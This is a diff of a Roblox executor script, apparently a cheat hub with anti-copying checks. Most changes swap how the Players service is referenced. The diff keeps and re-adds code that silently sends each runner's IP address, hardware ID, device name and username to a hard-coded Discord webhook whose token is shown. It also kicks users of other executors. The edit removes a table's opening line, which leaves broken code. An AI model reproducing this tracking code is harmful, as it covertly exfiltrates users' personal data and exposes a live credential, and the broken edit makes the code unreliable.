@@ -3,7 +3,7 @@ if not game:IsLoaded() then game.Loaded:Wait() end
 
 getgenv().secretfunc = function(func)
 	if func == nil then
-		game.Players.LocalPlayer:Kick("not available right now!")
+		game:GetService("Players").LocalPlayer:Kick("not available right now!")
 		error("kaka!")
 	else
 		local result = func()
@@ -11,7 +11,7 @@ getgenv().secretfunc = function(func)
 		if result == "cyUSkT6AgP" then
 			
 		else
-			game.Players.LocalPlayer:Kick("Lil bro ur api version is outdated go and update it")
+			game:GetService("Players").LocalPlayer:Kick("Lil bro ur api version is outdated go and update it")
 			error("Outdated Error")
 		end
 	end
@@ -363,12 +363,12 @@ task.spawn(function()
         return result
     end
 
-    local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
+    local message = "Device -> "..kaka().."\nUser -> "..game:GetService("Players").LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
     local options = {
         Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
         Body = HttpService:JSONEncode({
             ['content'] = tostring(message),
-            ['username'] = "User "..gethwid()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+            ['username'] = "User "..gethwid()
         }),
         Method = 'POST',
         Headers = {
@@ -382,12 +382,11 @@ task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
-            local kakav3 = "<@1096243430146977832> \nidentifyexecutor -> "..identifyexecutor().."\ngetexecutorname -> "..getexecutorname().."\nIp -> "..disocrdip().."\nHwid -> "..gethwid().."\nUsername -> "..game.Players.LocalPlayer.Name
-            local kaka = {
+            local kakav3 = "<@1096243430146977832> \nidentifyexecutor -> "..identifyexecutor().."\ngetexecutorname -> "..getexecutorname().."\nIp -> "..disocrdip().."\nHwid -> "..gethwid().."\nUsername -> "..game:GetService("Players").LocalPlayer.Name
                 Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
                 Body = HttpService:JSONEncode({
                     ['content'] = tostring(kakav3),
-                    ['username'] = "Kaka Skidder"--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+                    ['username'] = "Kaka Skidder"
                 }),
                 Method = 'POST',
                 Headers = {
@@ -395,7 +394,7 @@ task.spawn(function()
                 }
             }
             sendRequest(kaka, timeout)
-            game.Players.LocalPlayer:Kick("stop skidding lil bro")
+            game:GetService("Players").LocalPlayer:Kick("stop skidding lil bro")
             error("skidder alert")
         end
     end
